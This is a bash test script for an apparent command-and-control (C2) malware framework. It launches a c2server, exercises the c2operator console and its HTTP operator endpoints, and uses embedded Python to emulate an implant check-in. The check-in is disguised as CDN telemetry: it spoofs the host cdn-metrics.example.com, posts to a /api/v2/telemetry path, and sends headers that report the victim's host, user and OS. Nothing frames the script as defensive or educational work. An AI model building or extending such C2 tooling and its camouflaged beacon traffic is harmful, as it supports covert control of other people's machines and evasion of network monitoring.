#!/usr/bin/env bash
set -u
cd "$(dirname "$0")/.." || exit 1

ROOT="$PWD"
BIN="$ROOT/build_linux"
LOG="$ROOT/out"
mkdir -p "$LOG"
rm -f "$ROOT/sessions.jsonl" "$ROOT/sessions.jsonl.events"

if command -v pkill >/dev/null; then pkill -x c2server 2>/dev/null; fi
sleep 0.3

stdbuf -oL -eL "$BIN/c2server" "$ROOT/certs/server.crt" "$ROOT/certs/server.key" 8444 \
    >"$LOG/server.log" 2>&1 &
SRV_PID=$!
trap 'kill $SRV_PID 2>/dev/null' EXIT

PIN=""
for _ in $(seq 1 40); do
    PIN=$(grep -oE 'x25519 pub: [0-9a-f]+' "$LOG/server.log" 2>/dev/null | head -1 | awk '{print $3}')
    [ -n "$PIN" ] && break
    sleep 0.25
done

echo "=== boot ==="
cat "$LOG/server.log"
if [ -z "$PIN" ]; then
    echo "[FAIL] server did not print the X25519 key"; exit 1
fi
echo "[ok] pin = $PIN"

echo
echo "=== operator: help / sessions / ping (via pipe) ==="
printf 'help\nsessions\nquit\n' | "$BIN/c2operator" 2>&1 | tee "$LOG/operator.log"

echo
echo "=== /op/ping ==="
curl -s -o /dev/null -w 'status=%{http_code}\n' -X POST http://127.0.0.1:8443/op/ping -d '{}'
curl -s http://127.0.0.1:8443/op/sessions; echo

echo
echo "=== TLS handshake on :8444 ==="
echo | openssl s_client -connect 127.0.0.1:8444 -servername cdn-metrics.example.com 2>/dev/null \
    | grep -E 'subject=|Protocol|Cipher' | head -5

python3 - "$PIN" "$LOG/hello.bin" <<'PY'
import os, ssl, socket, sys, struct, binascii
pin = sys.argv[1]; out = sys.argv[2]
# generate 32 random bytes (client x25519 pub — need not be a valid point for the wire test)
body = os.urandom(32)
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
with socket.create_connection(("127.0.0.1", 8444), timeout=10) as raw:
    with ctx.wrap_socket(raw, server_hostname="cdn-metrics.example.com") as s:
        req = (b"POST /api/v2/telemetry HTTP/1.1\r\nHost: cdn-metrics.example.com\r\n"
               b"Content-Type: application/octet-stream\r\nX-Host: testvm\r\nX-User: dj\r\n"
               b"X-Os: linux\r\nContent-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
        s.sendall(req)
        data = b""
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
head, _, resp = data.partition(b"\r\n\r\n")
open(out, "wb").write(resp)
print(head.decode(errors="replace").splitlines()[0])
print("envelope bytes =", len(resp), " expected nonce+tag overhead =", 28)
PY

echo
echo "=== sessions.jsonl ==="
cat "$ROOT/sessions.jsonl" 2>/dev/null || echo "(empty)"
echo
echo "=== done ==="